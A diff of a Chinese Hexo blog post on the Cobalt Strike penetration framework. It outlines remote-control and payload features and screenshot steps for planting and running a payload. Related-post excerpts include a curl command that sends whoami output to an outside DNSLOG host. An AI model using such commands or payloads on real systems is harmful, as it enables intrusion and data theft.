@@ -1,105 +1,345 @@
+<!--
+	作者：Sariay
+	时间：2018-09-25
+	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
+-->
 <!DOCTYPE html>
-<html>
+<html class="html-loading">
+		
+
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="utf-8">
-  
-  
-  <meta name="description" content="​         Cobalt Strike（简称CS）是全球黑客公认一款非常优秀的渗透测试神器，以metasploit为基础的GUI的框架式渗透工具，集成了传统远控功能（远程桌面VNC、键盘记录、CmdShell、文件管理）、0day提权、进程注入、域内渗透、密码获取、Hash注入、端口转发、Socks代理、服务扫描、自动化溢出、可自定义攻击插件等功能；支持多协议上线（DNS/TCP/ICMP/HTTP）、多格式Payload生成（多语言ShellCode、EXE、DLL、PowerShell、脚本、自动播放、office宏病毒）；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。">
-  
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+       Cobalt Strike渗透工具 | Ƥ����ջ
+    
+  </title>
+  <meta name="author" content="Ƥ������">
+  <meta name="keywords" content>
+  <meta name="description" content>
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
 
+  <!-- css -->
+  <link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="/css/Annie.css">
   
-  
-  
-  
-  
-  
-  <title> Cobalt Strike渗透工具 | Ƥ����ջ</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="​         Cobalt Strike（简称CS）是全球黑客公认一款非常优秀的渗透测试神器，以metasploit为基础的GUI的框架式渗透工具，集成了传统远控功能（远程桌面VNC、键盘记录、CmdShell、文件管理）、0day提权、进程注入、域内渗透、密码获取、Hash注入、端口转发、Socks代理、服务扫描、自动化溢出、可自定义攻击插件等功能；支持多协议上线（DNS/TCP/ICMP">
-<meta property="og:type" content="article">
-<meta property="og:title" content=" Cobalt Strike渗透工具">
-<meta property="og:url" content="https://pidandoufu.github.io/2019/03/27/Cobalt-Strike渗透工具/index.html">
-<meta property="og:site_name" content="Ƥ����ջ">
-<meta property="og:description" content="​         Cobalt Strike（简称CS）是全球黑客公认一款非常优秀的渗透测试神器，以metasploit为基础的GUI的框架式渗透工具，集成了传统远控功能（远程桌面VNC、键盘记录、CmdShell、文件管理）、0day提权、进程注入、域内渗透、密码获取、Hash注入、端口转发、Socks代理、服务扫描、自动化溢出、可自定义攻击插件等功能；支持多协议上线（DNS/TCP/ICMP">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://pidandoufu.github.io/img/img1.png">
-<meta property="og:image" content="https://pidandoufu.github.io/img/img2.png">
-<meta property="og:image" content="https://pidandoufu.github.io/img/img3.png">
-<meta property="og:image" content="https://pidandoufu.github.io/img/img4.png">
-<meta property="og:image" content="https://pidandoufu.github.io/img/img5.png">
-<meta property="og:image" content="https://pidandoufu.github.io/img/img6.png">
-<meta property="og:image" content="https://pidandoufu.github.io/img/img7.png">
-<meta property="og:image" content="https://pidandoufu.github.io/img/QQ截图20190327102518.png">
-<meta property="og:image" content="https://pidandoufu.github.io/img/img8.png">
-<meta property="og:image" content="https://pidandoufu.github.io/img/img9.png">
-<meta property="og:image" content="https://pidandoufu.github.io/img/img10.png">
-<meta property="og:updated_time" content="2019-03-27T08:24:24.681Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content=" Cobalt Strike渗透工具">
-<meta name="twitter:description" content="​         Cobalt Strike（简称CS）是全球黑客公认一款非常优秀的渗透测试神器，以metasploit为基础的GUI的框架式渗透工具，集成了传统远控功能（远程桌面VNC、键盘记录、CmdShell、文件管理）、0day提权、进程注入、域内渗透、密码获取、Hash注入、端口转发、Socks代理、服务扫描、自动化溢出、可自定义攻击插件等功能；支持多协议上线（DNS/TCP/ICMP">
-<meta name="twitter:image" content="https://pidandoufu.github.io/img/img1.png">
-  
-  
-    <link rel="icon" href="/css/images/favicon.ico">
-  
-  <link rel="stylesheet" href="/css/style.css">
-  
+  <!-- jquery -->
+	<script src="/js/jquery.min.js"></script>
 
-  
-  <!-- baidu webmaster push -->
-  <script src="//push.zhanzhang.baidu.com/push.js"></script>
-</head></html>
-<body class="home blog custom-background custom-font-enabled single-author">
-  <div id="page" class="hfeed site">
-      <header id="masthead" class="site-header" role="banner">
-    <hgroup>
-      <h1 class="site-title">
-        <a href="/" title="Ƥ����ջ" rel="home">Ƥ����ջ</a>
-      </h1>
-      
-        <h2 class="site-description hitokoto"></h2>
-        <script type="text/javascript" src="https://v1.hitokoto.cn/?encode=js"></script>
-      
-    </hgroup>
+  <!-- leancloud -->
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+<script src="/js/leancloud.js"></script>
+</head>
+	<body>
+		<!-- Preloader -->
 
-    <nav id="site-navigation" class="main-navigation" role="navigation">
-            <button class="menu-toggle">菜单</button>
-            <a class="assistive-text" href="/#content" title="跳至内容">跳至内容</a><!--TODO-->
-            <div class="menu-main-container">
-                <ul id="menu-main" class="nav-menu">
-                
-                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/">Home</a></li>
-                
-                    <li class="menu-item menu-item-type-post_type menu-item-object-page"><a href="/archives">Archives</a></li>
-                
-                </ul>
-            </div>
-    </nav>
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="transition">
+					<div class="three-bounce1"></div>
+					<div class="three-bounce2"></div>
+					<div class="three-bounce3"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground" data-img-mode="normal" data-normal-src="/img/1.jpg" data-random-max="110" data-random-src="https://sariay.github.io/Random-img/">
+	<div class="mask">
+		<!-- Logo and navigation -->
+		<div class="h-header">
+			<div id="logo">
+				<a href="/">
+						
+						<img src="/img/logo.png" alt="Logo">
+					
+				</a>
+			</div>
+			
+			<div id="navigation-show">
+				<ul>
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home">主页</a>
+		</li>
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive">归档</a>
+		</li>
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories">分类</a>
+		</li>
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags">标签</a>
+		</li>
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about">关于</a>
+		</li>
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery">相册</a>
+		</li>
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+			</div>				
+		</div>
+
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<p class="motto"></p>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more"><i class="fa fa-angle-double-down" aria-hidden="true"></i>
+			</a>
+
+			
+				<!-- 
+	This is only a demo, please go to "https://time.is" to set your city time! 
+-->
+<style type="text/css">
+	.header-date {
+		font-size: 1.6rem;
+		color: #fff;
+		position: absolute;
+		bottom: 5px;
+		right: 1rem;
+		writing-mode: tb-rl;
+	}	
+	
+	.header-date a {
+		border-bottom: none;
+	}
+
+	@media only screen and (max-width: 768 ) {
+		.header-date {
+			font-size: 1rem;
+		}			
+	}
+</style>
+<div class="header-date">
+	<a href="https://time.is/Beijing" id="time_is_link" rel="nofollow"></a>
+	<span id="Beijing_z43d"></span>
+</div>
+<script src="//widget.time.is/zh.js"></script>
+<script>
+	time_is_widget.init({
+		Beijing_z43d:{
+			template:"DATE", 
+			date_format:"year年 monthname dnum日"
+		}
+	});
+</script>
+			
+		</div>
+	</div>
 </header>
 
-      <div id="main" class="wrapper">
-        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-Cobalt-Strike渗透工具" class="post-Cobalt-Strike渗透工具 post type-post status-publish format-standard hentry">
-    <!---->
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
 
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title article-title">
-       Cobalt Strike渗透工具
-    </h1>
-  
+	<!-- Progress percent -->
+	<div id="progress-percentage"><h1>0.0%</h1></div>
 
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="https://pidandoufu.github.io/2019/03/27/Cobalt-Strike渗透工具/" data-id="cjv2eo1ja0000awwfqc1nnxzx" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
 
-    <div class="entry-content">
-      
-        <p>​         Cobalt Strike（简称CS）是全球黑客公认一款非常优秀的渗透测试神器，以metasploit为基础的GUI的框架式渗透工具，集成了传统远控功能（远程桌面VNC、键盘记录、CmdShell、文件管理）、0day提权、进程注入、域内渗透、密码获取、Hash注入、端口转发、Socks代理、服务扫描、自动化溢出、可自定义攻击插件等功能；支持多协议上线（DNS/TCP/ICMP/HTTP）、多格式Payload生成（多语言ShellCode、EXE、DLL、PowerShell、脚本、自动播放、office宏病毒）；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。</p>
+	<!-- Page title -->
+	<p>
+		
+			当前文章&nbsp;:&nbsp;《 Cobalt Strike渗透工具》
+		
+	</p>
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<h3>Navigation</h3>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	<div class="nav-body">
+		<ul>
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home">主页</a>
+		</li>
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive">归档</a>
+		</li>
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories">分类</a>
+		</li>
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags">标签</a>
+		</li>
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about">关于</a>
+		</li>
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery">相册</a>
+		</li>
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	<div class="nav-footer">
+		<ul>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-github"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-weibo"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-pinterest"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-instagram"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
+				<i class="fa fa-twitter"></i>
+			</a>
+		</li>
+	
+		<li>
+			<a href="/atom.xml" target="_blank">
+				<i class="fa fa-rss"></i>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+		<script src="/plugin/toc/katelog.min.js"></script>
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+	<div class="article-title">
+		<i class="fa fa-paper-plane-o" aria-hidden="true"></i>
+		
+	<a href="/2019/03/27/Cobalt-Strike渗透工具/" itemprop="url">
+		 Cobalt Strike渗透工具
+	</a>
+
+	</div>
+
+	<div class="article-meta">
+		<span>
+			<i class="fa fa-calendar"></i>
+			
+
+
+	发布于
+
+	<a href="/2019/03/27/Cobalt-Strike渗透工具/" itemprop="url">
+		<time datetime="2019-03-27T01:13:01.000Z" itemprop="datePublished">
+	  		2019-03-27
+	  </time>
+	</a>
+	&nbsp;
+
+
+
+
+
+			
+
+
+
+
+	更新于
+
+	<a href="/2019/03/27/Cobalt-Strike渗透工具/" itemprop="url">
+		<time datetime="2019-03-27T01:13:01.000Z" itemprop="dateUpdated">
+	  		2019-03-27
+	  </time>
+	</a> 
+
+
+
+		</span>
+		<span>
+			<i class="fa fa-tags"></i>
+					
+		</span>
+		
+		
+
+
+
+	</div>
+
+	<div class="article-content" id="article-content">
+		<p>​         Cobalt Strike（简称CS）是全球黑客公认一款非常优秀的渗透测试神器，以metasploit为基础的GUI的框架式渗透工具，集成了传统远控功能（远程桌面VNC、键盘记录、CmdShell、文件管理）、0day提权、进程注入、域内渗透、密码获取、Hash注入、端口转发、Socks代理、服务扫描、自动化溢出、可自定义攻击插件等功能；支持多协议上线（DNS/TCP/ICMP/HTTP）、多格式Payload生成（多语言ShellCode、EXE、DLL、PowerShell、脚本、自动播放、office宏病毒）；钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等等。</p>
 <a id="more"></a>
 <h3 id="环境要求："><a href="#环境要求：" class="headerlink" title="环境要求："></a>环境要求：</h3><ul>
 <li><p><strong>0x001 环境</strong><br>CS 3.12 或 3.13</p>
@@ -130,110 +370,686 @@
 <h5 id="9-投放病毒"><a href="#9-投放病毒" class="headerlink" title="9.投放病毒"></a>9.投放病毒</h5><p><img src="/img/img8.png" alt></p>
 <h5 id="10-点击运行我们投放的病毒："><a href="#10-点击运行我们投放的病毒：" class="headerlink" title="10.点击运行我们投放的病毒："></a>10.点击运行我们投放的病毒：</h5><p><img src="/img/img9.png" alt></p>
 <h5 id="11-出现如图，监听成功："><a href="#11-出现如图，监听成功：" class="headerlink" title="11.出现如图，监听成功："></a>11.出现如图，监听成功：</h5><p><img src="/img/img10.png" alt></p>
+	
+	</div>
+	
+	<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
 
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2019/03/27/Cobalt-Strike渗透工具/">
-    <time datetime="2019-03-27T01:13:01.000Z" class="entry-date">
-        2019-03-27
-    </time>
-</a>
-    
-    
-    </footer>
-</article>
-
-
-    
-<nav class="nav-single">
-    <h3 class="assistive-text">文章导航</h3>
-    
-        <span class="nav-previous"><a href="/2019/03/31/Php-mysql-html简单留言板制作/" rel="prev"><span class="meta-nav">←</span> Php+mysql+html简单留言板制作</a></span>
-    
-    
-        <span class="nav-next"><a href="/2019/03/17/利用msf生成木马入侵电脑/" rel="next">利用msf生成木马入侵电脑 <span class="meta-nav">→</span></a></span>
-    
-</nav><!-- .nav-single -->
-
-
-
-
+	<!-- relate post, comment...-->
+	<div class="investment-container">
+		<div class="investment-header">
+			<div class="investment-title-1">
+				<div class="on">相关文章</div>
+				<div>评论</div>
+				<div>分享</div>
+			</div>
+			<div class="investment-title-2">	            
+				
+	<span>
+		<a href="javascript: window.scrollTo(0, 0);">返回顶部</a>
+		
+			<a href="/2019/03/31/Php-mysql-html简单留言板制作/" title="Php+mysql+html简单留言板制作" rel="prev">
+				&laquo;上一篇
+			</a>
+		
+		
+			<a href="/2019/03/17/利用msf生成木马入侵电脑/" title="利用msf生成木马入侵电脑" rel="next">
+				下一篇&raquo;
+			</a>
+			
+	</span>
 
 
+      		
+			</div>	
+		</div>
+		
+		<div class="investment-content">
+			<div class="investment-content-list">
+				
 
-</div></div>
-        <div id="secondary" class="widget-area" role="complementary">
-  
-    <aside id="search" class="widget widget_search"><form role="search" method="get" accept-charset="utf-8" id="searchform" class="searchform" action="//google.com/search">
-    <div>
-        <input type="text" value name="s" id="s">
-        <input type="submit" id="searchsubmit" value="搜索">
-    </div>
-</form></aside>
-  
-    
-  
-    
-  
-    
-  <aside class="widget">
-    <h3 class="widget-title">Recents</h3>
-    <div class="widget-content">
-      <ul>
-        
-          <li>
-            <a href="/2019/04/28/一句话木马及变形/">一句话木马及变形</a>
-          </li>
-        
-          <li>
-            <a href="/2019/04/28/文件上传的七种姿势/">文件上传的七种姿势</a>
-          </li>
-        
-          <li>
-            <a href="/2019/04/15/DNSLOG在盲注中的使用/">DNSLOG在盲注中的使用</a>
-          </li>
-        
-          <li>
-            <a href="/2019/04/14/sql注入-二/">sql注入(二)</a>
-          </li>
-        
-          <li>
-            <a href="/2019/04/11/sql注入/">sql注入(一)</a>
-          </li>
-        
-      </ul>
-    </div>
-  </aside>
+<div class="relate-post">
+	
+		<ul>
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/28/一句话木马及变形/" title="一句话木马及变形">
+								一句话木马及变形			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 28日, 2019				
+							</p>
+							<p class="relate-post-content">
+								一句话木马变形
+介绍：网站后门，也可以叫做WebShell，黑客在入侵了一个网站后，通常会将一些asp或php文件与网 站服务器WEB目录下正常的网页文件混在一起，使得可以通过使用浏览器来访问这些asp或者php 文件，从而得到一个命...
+							</p>
+						</div>
 
-  
-    
-  
-    
-  
+						<div class="relate-post-cover">
+							<a href="/2019/04/28/一句话木马及变形/" title="一句话木马及变形">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="一句话木马及变形">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/28/文件上传的七种姿势/" title="文件上传的七种姿势">
+								文件上传的七种姿势			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 28日, 2019				
+							</p>
+							<p class="relate-post-content">
+								
+
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/28/文件上传的七种姿势/" title="文件上传的七种姿势">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="文件上传的七种姿势">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/15/DNSLOG在盲注中的使用/" title="DNSLOG在盲注中的使用">
+								DNSLOG在盲注中的使用			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 15日, 2019				
+							</p>
+							<p class="relate-post-content">
+								DNSLOG在盲注中的使用0x00 Command Execution
+i. *nix:12curl http://ip.port.b182oj.ceye.io/`whoami`ping `whoami`.ip.port.b182oj...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/15/DNSLOG在盲注中的使用/" title="DNSLOG在盲注中的使用">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="DNSLOG在盲注中的使用">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/14/sql注入-二/" title="sql注入(二)">
+								sql注入(二)			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 14日, 2019				
+							</p>
+							<p class="relate-post-content">
+								报错注入、​     报错函数（举例）  
+​            （1）extractvalue(参数1，参数2)
+​                          从目标XML中返回查询的字符串，参数1  是string格式...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/14/sql注入-二/" title="sql注入(二)">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="sql注入(二)">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/11/sql注入/" title="sql注入(一)">
+								sql注入(一)			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 11日, 2019				
+							</p>
+							<p class="relate-post-content">
+								sql注入漏洞，主要介绍有以下几种
+
+
+5.0mysql数据库特性
+
+手工注入一般步骤
+
+常用的万能密码
+
+联和注入
+
+基于布尔的盲注
+
+基于时间的盲注
+
+5.0mysql数据库特性information _schema
+自带，系统库...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/11/sql注入/" title="sql注入(一)">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="sql注入(一)">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/08/msf浏览器自动攻击/" title="msf浏览器自动攻击">
+								msf浏览器自动攻击			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 8日, 2019				
+							</p>
+							<p class="relate-post-content">
+								msf浏览器自动攻击
+首先查看数据库状态 ，并启动数据库12/etc/init.d/postgresql status/etc/init.d/postgresql start
+
+打开msf:1msfconsole
+搜索我们需要的浏览器...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/08/msf浏览器自动攻击/" title="msf浏览器自动攻击">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="msf浏览器自动攻击">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/01/HTTP三次挥手和四次挥手/" title="HTTP三次挥手和四次挥手">
+								HTTP三次挥手和四次挥手			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 1日, 2019				
+							</p>
+							<p class="relate-post-content">
+								大鲨鱼数据包拦截，http三次握手和四次挥手
+http  三次握手​        
+
+SYN是标志位，SYN=1表示请求连接
+
+*第一次握手：Server 猜测Client可能要建立TCP请求，但不确定，因为也可能是Client乱发...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/01/HTTP三次挥手和四次挥手/" title="HTTP三次挥手和四次挥手">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="HTTP三次挥手和四次挥手">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/04/01/状态码/" title="状态码">
+								状态码			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								四月 1日, 2019				
+							</p>
+							<p class="relate-post-content">
+								详细分解：1xx（临时响应）表示临时响应并需要请求者继续执行操作的状态代码。
+
+代码   说明100   （继续） 请求者应当继续提出请求。 服务器返回此代码表示已收到请求的第一部分，正在等待其余部分。101   （切换协议） 请求者...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/04/01/状态码/" title="状态码">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="状态码">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/03/31/DNS欺骗/" title="DNS欺骗">
+								DNS欺骗			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 31日, 2019				
+							</p>
+							<p class="relate-post-content">
+								 实战DNS欺骗
+DNS（Domain Name System，域名系统）欺骗：DNS欺骗就是攻击者冒充域名服务器的一种欺骗行为。 原理：如果可以冒充域名服务器，然后把查询的IP地址设为攻击者的IP地址，这样的话，用户上网就只能看到攻...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/03/31/DNS欺骗/" title="DNS欺骗">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="DNS欺骗">
+							</a>
+						</div>
+					</li>											
+			
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2019/03/31/Php-mysql-html简单留言板制作/" title="Php+mysql+html简单留言板制作">
+								Php+mysql+html简单留言板制作			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 31日, 2019				
+							</p>
+							<p class="relate-post-content">
+								准备（由于本人前端人员，页面优化未作处理，可随喜好自行添加css样式）
+
+数据库两个 一个用来储存用户信息，一个用来存储留言信息
+
+首先给大家展示下效果图
+
+1.下面就开始我留言板制作：首先设计我们登陆页面，首先我们需要搭建一个登录页...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2019/03/31/Php-mysql-html简单留言板制作/" title="Php+mysql+html简单留言板制作">				
+								
+								<img class="lazy" src="/img/placeholder.jpg" data-src="/img/cart_cover.jpg" alt="Php+mysql+html简单留言板制作">
+							</a>
+						</div>
+					</li>											
+			
+			
+		</ul>
+	
+</div>	
+			</div>
+			<div class="investment-content-list">
+				<div class="layout-comment">
+
+	
+
+		
+
+			<!-- I don't know !!!-->
+			<div>Please check the comment setting in config.yml of hexo-theme-Annie!</div>
+			
+		
+		
+	
+
 </div>
-      </div>
-      <footer id="colophon" role="contentinfo">
-    <p>&copy; 2019 Ƥ������
-    All rights reserved.</p>
-    <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+			</div>
+			<div class="investment-content-list">
+				<div class="layout-share">
+	
+	
+
+		
+			
+			<!-- socialShare share -->
+			<div class="social-share"></div>
+
+<!--  css & js -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+			
+		
+		
+	
+</div>
+
+
+			</div>
+		</div>	
+	</div>
+	</div>
+</div>
+
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+
+<!-- show math formula -->
+
+
+
+	 
+	<script src="/plugin/clipboard/clipboard.js"></script>
+	<script>
+		// Copy code !
+	    function codePreprocessing() {
+	        $("#article-content .highlight").each(function() {
+
+	            $(this).wrap('<div id="post-code"></div>');
+
+	        })
+
+	        $("#article-content #post-code").each(function() {
+
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            var temp = $(this).next().attr('class'),
+	                language = ((temp.length > 9) && (temp != null)) ? temp.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+
+	            $(this).append('<span class="copy-btn"><i class="fa fa-copy" aria-hidden="true"></i></span>');
+
+	        });
+	    }
+
+		function codeCopy() {
+		    $('#article-content #post-code').each(function(i) {
+		        var codeCopyId = 'codeCopy-' + i;
+
+		        var codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+
+		    
+			var clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn copy-status');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');
+			    
+			});
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		
+
+		}
+
+		if ($('.layout-post').length) {
+		    codePreprocessing();
+		    codeCopy();
+		} 
+	</script>
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+<script type="text/javascript">
+	var titleID = $('.article-title a'),
+		imageID = $('.article-content img'),
+		videoID = $('.article-content video');
+
+	var postTitle = titleID.text() ? titleID.text() : "No post title!";
+
+	imageID.each(function() {
+		var imgPath = $(this).attr('src'),
+			imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+
+		//给每个匹配的<img>元素打包, 即添加父元素<a>
+		$(this).wrap('<a data-fancybox="gallery" data-caption=" 《 ' + postTitle + ' 》 ' + imgTitle + ' "  href=" ' + imgPath + ' "> </a>');
+	});
+
+	videoID.each(function() {
+		var videoPath = $(this).attr('src');
+
+		//给每个匹配的<img>元素打包, 即添加父元素<a>
+		$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+	});
+	//TODO：支持html5 video
+
+	if($('#layout-post').length) {
+		$('[data-fancybox="gallery"]').fancybox({
+			loop: true,
+			buttons: [
+				"zoom",
+				"share",
+				"slideShow",
+				"fullScreen",
+				//"download",
+				"thumbs",
+				"close"
+			],
+			protect: false
+		});
+	}
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div class="social">
+		<ul>
+	
+		<li>
+			<a href="http://github.com/" target="_blank">
